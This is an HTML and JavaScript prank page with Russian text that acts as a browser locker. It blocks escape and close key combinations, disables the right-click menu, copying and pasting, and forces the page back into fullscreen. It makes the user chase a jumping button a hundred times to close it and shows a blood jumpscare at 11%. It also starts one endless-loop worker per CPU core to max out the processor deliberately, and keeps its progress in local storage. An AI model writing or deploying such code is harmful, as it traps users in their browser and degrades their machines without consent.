<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ANTIDOTE + 11% SCARE</title>
    <style>
        body {
            background: url('https://avatars.mds.yandex.net/i?id=812dcd22b1b1798df7daf79ae5d2731540b75369-8497211-images-thumbs&n=13') no-repeat center center fixed;
            background-size: cover;
            color: #0ff;
            font-family: 'Courier New', monospace;
            text-align: center;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            position: relative;
            transition: background-image 0.3s ease;
        }
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: -1;
        }
        /* Контейнеры для эффектов (изначально скрыты) */
        .scare-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; /* чтобы не мешать кликам */
            z-index: 1000;
            display: none;
        }
        .blood-drop {
            position: absolute;
            background: #8a0303;
            width: 4px;
            height: 30px;
            border-radius: 50% 50% 0 0;
            box-shadow: 0 0 15px #ff0000;
            opacity: 0.8;
            animation: drip 1s infinite ease-in-out;
        }
        .blood-splatter {
            position: absolute;
            background: #8a0303;
            width: 80px;
            height: 80px;
            border-radius: 50%;
            filter: blur(10px);
            opacity: 0.7;
            box-shadow: 0 0 30px #ff0000;
        }
        .blood-smear {
            position: absolute;
            background: #8a0303;
            width: 150px;
            height: 20px;
            border-radius: 20px;
            transform: rotate(15deg);
            filter: blur(5px);
            opacity: 0.8;
            box-shadow: 0 0 20px #ff0000;
        }
        @keyframes drip {
            0% { transform: translateY(0); opacity: 1; }
            50% { transform: translateY(20px); opacity: 0.7; }
            100% { transform: translateY(0); opacity: 1; }
        }
        #container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 20, 20, 0.8);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 30px cyan;
            border: 2px solid cyan;
            width: 500px;
            min-height: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }
        h1 {
            font-size: 1.8em;
            text-shadow: 0 0 15px cyan;
            margin-bottom: 5px;
        }
        .kg-counter {
            font-size: 2.5em;
            margin: 5px 0;
            color: #ffaa00;
        }
        .progress {
            font-size: 2em;
            margin: 10px 0;
            color: #ffaa00;
        }
        #buttonContainer {
            position: relative;
            width: 100%;
            height: 100px;
            margin: 10px 0;
        }
        #clickButton {
            position: absolute;
            background: #0ff;
            border: none;
            color: #000;
            font-size: 1.5em;
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 0 20px cyan;
            transition: 0.1s;
            white-space: nowrap;
            z-index: 20;
        }
        #clickButton:hover {
            background: #ffaa00;
            box-shadow: 0 0 30px orange;
        }
        #bg-music {
            display: none;
        }
        .music-note {
            margin-top: 10px;
            font-size: 0.8em;
            color: #8ff;
        }
    </style>
</head>
<body>
    <!-- Элементы для хоррор-эффекта -->
    <div id="scareOverlay" class="scare-overlay">
        <!-- Несколько капель -->
        <div class="blood-drop" style="left: 10%; top: -20px;"></div>
        <div class="blood-drop" style="left: 30%; top: -10px; height: 50px; width: 6px;"></div>
        <div class="blood-drop" style="left: 50%; top: -30px; height: 40px;"></div>
        <div class="blood-drop" style="left: 70%; top: -5px;"></div>
        <div class="blood-drop" style="left: 90%; top: -15px; height: 60px;"></div>
        <!-- Кровавые пятна -->
        <div class="blood-splatter" style="left: 5%; top: 20%;"></div>
        <div class="blood-splatter" style="right: 10%; bottom: 30%;"></div>
        <div class="blood-smear" style="left: 20%; top: 70%;"></div>
        <div class="blood-smear" style="right: 15%; top: 40%; transform: rotate(-10deg);"></div>
    </div>

    <div id="container">
        <h1>🔥 КЛИКАЙ НА КНОПКУ ЧТОБ ЗАКРЫТЬ 🔥</h1>
        <div class="kg-counter" id="kgDisplay">0 кг</div>
        <div class="progress" id="progressDisplay">0%</div>
        <div id="buttonContainer">
            <button id="clickButton">КЛИКАЙ ТУТ</button>
        </div>
        <div class="music-note" id="musicStatus">🎵 Музыка включится после первого клика</div>
    </div>

    <audio id="bg-music" loop src="music.mp3"></audio>

    <script>
        (function() {
            // ========== БЛОКИРОВКА КЛАВИШ ==========
            function blockAllKeys(e) {
                const forbiddenKeys = [
                    'Escape', 'F11', 'F4', 'Alt', 'Control', 'Meta', 'Win', 'OS',
                    'Tab', 'Delete', 'Insert', 'Home', 'End', 'PageUp', 'PageDown'
                ];
                if (e.altKey || e.ctrlKey || e.metaKey || e.key === 'Alt' || e.key === 'Control' || e.key === 'Meta') {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
                if (forbiddenKeys.includes(e.key)) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
                if (e.altKey && e.key === 'F4') {
                    e.preventDefault();
                    return false;
                }
                if (e.ctrlKey && e.key === 'w') {
                    e.preventDefault();
                    return false;
                }
                if (e.ctrlKey && e.shiftKey && e.key === 'Escape') {
                    e.preventDefault();
                    return false;
                }
            }

            document.addEventListener('keydown', blockAllKeys);
            document.addEventListener('keyup', blockAllKeys);
            document.addEventListener('keypress', blockAllKeys);

            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('selectstart', e => e.preventDefault());
            document.addEventListener('copy', e => e.preventDefault());
            document.addEventListener('cut', e => e.preventDefault());
            document.addEventListener('paste', e => e.preventDefault());

            // ========== ПОЛНОЭКРАННЫЙ РЕЖИМ (опционально) ==========
            function requestFullscreen() {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen().catch(() => {});
                }
            }
            requestFullscreen();

            document.addEventListener('click', function() {
                requestFullscreen();
            });

            document.addEventListener('fullscreenchange', function() {
                if (!document.fullscreenElement && progress < 100) {
                    if (document.documentElement.requestFullscreen) {
                        document.documentElement.requestFullscreen().catch(() => {});
                    }
                }
            });

            // ========== ЭЛЕМЕНТЫ ДЛЯ ЭФФЕКТА ==========
            const scareOverlay = document.getElementById('scareOverlay');
            const progressDisplay = document.getElementById('progressDisplay');
            const music = document.getElementById('bg-music');
            const musicStatus = document.getElementById('musicStatus');
            let originalBackground = document.body.style.backgroundImage; // сохраняем исходный фон
            let musicWasPlaying = false;
            let scareActive = false; // флаг, чтобы не запустить повторно, пока идёт эффект
            let scareTimer = null;

            function startScareEffect() {
                if (scareActive) return;
                scareActive = true;

                // Сохраняем состояние музыки
                musicWasPlaying = !music.paused && music.currentTime > 0;
                // Останавливаем музыку
                music.pause();

                // Запоминаем текущий фон и меняем на чёрный
                originalBackground = document.body.style.backgroundImage;
                document.body.style.backgroundImage = 'none';
                document.body.style.backgroundColor = 'black';

                // Показываем оверлей с кровью
                scareOverlay.style.display = 'block';

                // Меняем текст процента на 666%
                const oldText = progressDisplay.innerText;
                progressDisplay.innerText = '666%';

                // Через 3 секунды всё возвращаем
                if (scareTimer) clearTimeout(scareTimer);
                scareTimer = setTimeout(function() {
                    // Возвращаем фон
                    document.body.style.backgroundImage = originalBackground;
                    document.body.style.backgroundColor = ''; // сброс

                    // Скрываем оверлей
                    scareOverlay.style.display = 'none';

                    // Возвращаем процент
                    progressDisplay.innerText = progress + '%';

                    // Возобновляем музыку, если она играла до эффекта
                    if (musicWasPlaying) {
                        music.play().catch(() => {});
                    }

                    scareActive = false;
                    scareTimer = null;
                }, 3000);
            }

            // ========== СЧЁТЧИК КГ ==========
            let kg = localStorage.getItem('kgCounter') || 0;
            kg = parseInt(kg);
            const kgDisplay = document.getElementById('kgDisplay');
            function updateKgDisplay() {
                kgDisplay.innerText = kg + ' кг';
            }
            updateKgDisplay();

            const kgInterval = setInterval(function() {
                kg += 10;
                localStorage.setItem('kgCounter', kg);
                updateKgDisplay();
            }, 1000);

            // ========== ПРОГРЕСС ЗАКРЫТИЯ ==========
            let progress = localStorage.getItem('closeProgress') || 0;
            progress = parseInt(progress);
            const button = document.getElementById('clickButton');
            const buttonContainer = document.getElementById('buttonContainer');
            let musicStarted = false;

            function updateBackground() {
                if (progress >= 67 && !scareActive) { // не меняем фон во время эффекта
                    document.body.style.backgroundImage = "url('https://i.ytimg.com/vi/PVN_l-PFRPE/maxresdefault.jpg')";
                } else if (!scareActive) {
                    document.body.style.backgroundImage = "url('https://avatars.mds.yandex.net/i?id=812dcd22b1b1798df7daf79ae5d2731540b75369-8497211-images-thumbs&n=13')";
                }
                document.body.style.backgroundSize = 'cover';
                document.body.style.backgroundPosition = 'center center';
                document.body.style.backgroundRepeat = 'no-repeat';
                document.body.style.backgroundAttachment = 'fixed';
            }

            function updateProgressDisplay() {
                if (!scareActive) {
                    progressDisplay.innerText = progress + '%';
                }
                updateBackground();
            }
            updateProgressDisplay();

            function tryPlayMusic() {
                if (!musicStarted) {
                    music.play().then(() => {
                        musicStarted = true;
                        musicStatus.innerText = '🎵 Музыка играет';
                    }).catch(e => {
                        musicStatus.innerText = '⚠️ Кликни ещё раз для музыки';
                        console.log('Music play failed:', e);
                    });
                }
            }

            function forceClose() {
                clearInterval(kgInterval);
                localStorage.removeItem('closeProgress');
                localStorage.removeItem('kgCounter');
                progress = 0;
                kg = 0;
                updateKgDisplay();
                updateProgressDisplay();

                window.close();
                setTimeout(function() {
                    window.open('', '_self', '');
                    window.close();
                    setTimeout(function() {
                        location.replace('about:blank');
                    }, 100);
                }, 100);
            }

            if (progress >= 100) forceClose();

            function moveButton() {
                const containerWidth = buttonContainer.clientWidth;
                const containerHeight = buttonContainer.clientHeight;
                const buttonWidth = button.offsetWidth;
                const buttonHeight = button.offsetHeight;
                let left = Math.random() * (containerWidth - buttonWidth);
                let top = Math.random() * (containerHeight - buttonHeight);
                button.style.left = left + 'px';
                button.style.top = top + 'px';
            }

            moveButton();

            button.addEventListener('click', function(e) {
                tryPlayMusic();

                if (progress < 100) {
                    progress++;
                    localStorage.setItem('closeProgress', progress);

                    // Проверяем, не настал ли момент 11% (и эффект ещё не активен и не был уже запущен для этого процента)
                    if (progress === 11 && !scareActive) {
                        startScareEffect();
                    }

                    updateProgressDisplay();
                    moveButton();

                    if (progress >= 100) {
                        forceClose();
                    }
                }
            });

            // ========== НАГРУЗКА CPU ==========
            if (window.Worker) {
                const coreCount = navigator.hardwareConcurrency || 4;
                for (let i = 0; i < coreCount; i++) {
                    try {
                        const blob = new Blob([`
                            onmessage = function(e) {
                                while (true) {
                                    Math.sqrt(Math.random() * 1e9);
                                    Math.sin(Math.random());
                                    Math.cos(Math.random());
                                    Math.tan(Math.random());
                                }
                            };
                        `]);
                        const worker = new Worker(URL.createObjectURL(blob));
                        worker.postMessage('start');
                    } catch (e) {}
                }
            }

            function lightLoad() {
                let start = Date.now();
                while (Date.now() - start < 5) {
                    Math.sqrt(Math.random() * 1e9);
                }
                setTimeout(lightLoad, 0);
            }
            lightLoad();

            window.addEventListener('beforeunload', function() {
                clearInterval(kgInterval);
            });
        })();
    </script>
</body>
</html>
